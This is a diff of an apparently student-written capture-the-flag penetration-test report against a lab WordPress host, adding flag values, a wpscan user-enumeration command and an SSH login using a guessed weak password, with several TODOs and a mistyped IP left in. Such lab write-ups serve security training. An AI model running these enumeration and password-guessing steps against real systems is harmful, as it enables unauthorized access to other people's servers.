@@ -66,17 +66,47 @@ The following vulnerabilities were identified on each target:
     - `wp_users`
     - `wp_posts`
 
+![user_hashes](../images/user_hashes.JPG)
+
+
+The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
+- `Target 1`
+  - ***_flag1.txt_***: `flag1{b6bbcb33e11b80be759c4e844862482d}` 
+
+**Exploit Used**
+- Enumerated the WordPress site using wpscan
+  > Command: wpscan --url http://192.168.1.110/wordpress -eu
+  
 ![wpscan1](../images/wpscan1.JPG)
 ![wpscan2](../images/wpscan2.JPG)
 ![wpscan3](../images/wpscan3.JPG)
 
-The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
-- Target 1
-  - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
+- I then went to the IP address via a web browser and inspected the page source to find the first flag.
+
+![webpage_target1](../images/webpage_target1.JPG)
+![flag1.2](../images/flag1.2JPG)
+![flag1](../images/flag1.JPG)
+
+***_flag2.txt_***: `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`
+**Exploit Used**
+- Using SSH to gain access to Michael's account
+  > Command: `ssh michael@192.68.1.110`
+  > Enter Password: `michael`
+
+![ssh_command](../images/ssh_command.JPG)
+
+> Command: `cd /var/www`
+> Command: `ls`
+
+![flag2](../images/flag2.JPG)
+
+`flag3.txt`: _TODO: Insert `flag2.txt` hash value_
     - **Exploit Used**
       - _TODO: Identify the exploit used_
       - _TODO: Include the command run_
-  - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
+
+
+  - `flag4.txt`: _TODO: Insert `flag2.txt` hash value_
     - **Exploit Used**
       - _TODO: Identify the exploit used_
       - _TODO: Include the command run_
